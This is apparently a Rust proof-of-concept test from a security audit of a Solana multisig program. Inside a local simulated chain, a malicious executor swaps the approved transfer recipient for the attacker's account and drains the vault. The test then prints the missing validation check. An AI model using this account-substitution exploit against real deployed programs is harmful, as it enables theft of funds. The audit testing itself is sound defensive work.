// Exploit: Recipient Substitution Attack (Missing Recipient Validation)
//
// Vulnerability: V004 - The execute_transfer_proposal instruction does not validate
// that the recipient account matches the proposal's intended recipient.
//
// Attack: Executor passes a different recipient account than what was approved,
// redirecting funds to their own wallet instead of the intended destination.
//
// Result: Complete fund redirection - all approved transfers can be stolen by
// any executor regardless of original proposal intent.

mod utils;

use utils::*;

use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_recipient_substitution() {
    println!("\n=== EXPLOIT TEST: Recipient Substitution (V004) ===\n");
    println!("[Scenario] Attacker substitutes recipient during execution");

    let mut scenario = setup_multisig_scenario(1, 0); // threshold = 1, timelock = 0

    println!("[Setup] Creating multisig with threshold = 1...");

    // Create multisig with 2 members
    let owners = vec![
        (scenario.creator.pubkey(), MemberRole::Admin),
        (scenario.member1.pubkey(), MemberRole::Proposer),
        (scenario.member2.pubkey(), MemberRole::Executor), // malicious executor
    ];

    create_multisig_with_owners(
        &mut scenario.svm,
        &scenario.creator,
        &scenario.multisig_pda,
        &scenario.vault_pda,
        scenario.multisig_id,
        1, // threshold
        0, // timelock
        &owners,
    );

    println!("[Setup] Multisig created with 3 members");

    // Fund the vault with 50 SOL
    println!("[Setup] Funding vault with 50 SOL...");
    fund_vault(
        &mut scenario.svm,
        &scenario.vault_pda,
        50 * LAMPORTS_PER_SOL,
    );

    let vault_balance = scenario.svm.get_account(&scenario.vault_pda)
        .expect("Vault should exist")
        .lamports;
    println!("[Setup] Vault balance: {} SOL", vault_balance / LAMPORTS_PER_SOL);

    // Create a legitimate recipient (charity, service provider, etc.)
    let legitimate_recipient = create_funded_account(&mut scenario.svm, LAMPORTS_PER_SOL);
    println!("[Setup] Legitimate recipient: {}", legitimate_recipient.pubkey());

    // Member1 creates proposal to send 50 SOL to legitimate recipient
    println!("\n[Setup] Member1 creates proposal to send 50 SOL to legitimate recipient...");

    // Get current proposal_count to derive correct PDA
    let proposal_count = get_multisig_proposal_count(&scenario.svm, &scenario.multisig_pda);
    let (transfer_proposal_pda, _) =
        derive_transfer_proposal_pda(&scenario.multisig_pda, proposal_count);

    let create_transfer_ix = build_create_transfer_proposal_ix(
        &scenario.member1.pubkey(),
        &scenario.multisig_pda,
        &transfer_proposal_pda,
        50 * LAMPORTS_PER_SOL,
        &legitimate_recipient.pubkey(), // APPROVED recipient
    );

    send_tx_expect_success(
        &mut scenario.svm,
        create_transfer_ix,
        &scenario.member1,
        &[&scenario.member1],
    );

    println!("[Setup] Proposal created and approved for legitimate recipient");
    println!("[Setup] Approved recipient: {}", legitimate_recipient.pubkey());

    // Record balances before exploit
    let attacker_balance_before = scenario.svm.get_account(&scenario.attacker.pubkey())
        .expect("Attacker account should exist")
        .lamports;
    let legit_balance_before = scenario.svm.get_account(&legitimate_recipient.pubkey())
        .expect("Legitimate recipient should exist")
        .lamports;

    println!("[Setup] Attacker balance before: {} SOL", attacker_balance_before / LAMPORTS_PER_SOL);
    println!("[Setup] Legitimate recipient balance before: {} SOL", legit_balance_before / LAMPORTS_PER_SOL);

    // EXPLOIT: Malicious executor (member2) substitutes attacker's address as recipient
    println!("\n[Attack] Malicious executor substitutes attacker address as recipient...");
    println!("[Attack] Proposal says: {}", legitimate_recipient.pubkey());
    println!("[Attack] Executor passes: {} (DIFFERENT!)", scenario.attacker.pubkey());

    let execute_ix_data = build_execute_transfer_proposal_data();

    let execute_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member2.pubkey(), true), // executor
            AccountMeta::new(scenario.multisig_pda, false),    // multisig_account
            AccountMeta::new(transfer_proposal_pda, false),    // transfer_proposal
            AccountMeta::new(scenario.vault_pda, false),       // vault
            AccountMeta::new(scenario.attacker.pubkey(), false), // SUBSTITUTED recipient!
            AccountMeta::new_readonly(solana_system_interface::program::ID, false), // system_program
        ],
        data: execute_ix_data,
    };

    let execute_tx = Transaction::new_signed_with_payer(
        &[execute_ix],
        Some(&scenario.member2.pubkey()),
        &[&scenario.member2],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(execute_tx);

    match result {
        Ok(metadata) => {
            println!("[VULNERABLE] Execution succeeded with SUBSTITUTED recipient!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);

            let attacker_balance_after = scenario.svm.get_account(&scenario.attacker.pubkey())
                .expect("Attacker account should exist")
                .lamports;
            let legit_balance_after = scenario.svm.get_account(&legitimate_recipient.pubkey())
                .expect("Legitimate recipient should exist")
                .lamports;

            println!("[EXPLOIT SUCCESS] Attacker balance after: {} SOL",
                attacker_balance_after / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Legitimate recipient balance after: {} SOL",
                legit_balance_after / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Stolen amount: {} SOL",
                (attacker_balance_after - attacker_balance_before) / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Legitimate recipient received: {} SOL",
                (legit_balance_after - legit_balance_before) / LAMPORTS_PER_SOL);

            println!("\n[Analysis] The vulnerable code is missing this check:");
            println!("           require!(");
            println!("               recipient.key() == self.transfer_proposal.recipient,");
            println!("               MultisigError::RecipientMismatch");
            println!("           );");
        }
        Err(e) => {
            println!("[Result] Execution failed: {:?}", e);
            println!("[Analysis] Expected to succeed due to missing recipient validation");

           let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
        }
    }

    println!("\n=== END: Recipient Substitution Exploit ===\n");
}
